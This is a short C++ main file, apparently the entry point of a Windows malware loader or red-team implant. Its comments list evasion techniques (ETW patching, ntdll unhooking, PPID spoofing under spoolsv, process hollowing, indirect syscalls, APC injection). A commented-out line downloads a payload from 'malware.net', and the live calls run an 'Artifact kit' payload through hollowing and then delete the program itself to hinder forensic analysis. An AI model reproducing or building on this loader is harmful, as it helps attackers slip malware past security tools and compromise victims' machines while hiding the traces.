#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include "Ven.h"



int main()
{
    // Compile Time API Hashing
    // Run-Time Dynamic Linking 
    // PPID spoofing
    // Process hollowing
    // Indirect syscalls execution
    // APC execution


    // Patching the Event Tracing for Windows (ETW) to prevent detection
    // evt_patch();

    // Create a fresh copy of the ntdll library from file to unhook functions
    // unhooking();

    // Get spoolsv PID for PPID spoofing
    DWORD pid = GetPID();



    // For payload download 
    // std::vector<BYTE> sh = Download(L"malware.net\0", L"/payload.bin\0");




    // For synchronous payload execution with PPID spoofing through process hollowing
    //Indirect_RawExec_ppid(pid);

    // For APC execution with indirect syscalls
    // IndirectAPC();

    // For APC execution in a remote process with indirect syscalls
    // IndirectRemoteAPC(pid);

    // For Artifact kit execution with PPID spoofing through process hollowing
    execArtifact(pid);



    // For self-deletion to prevent post-compromise analysis
    DeleteSelf();
}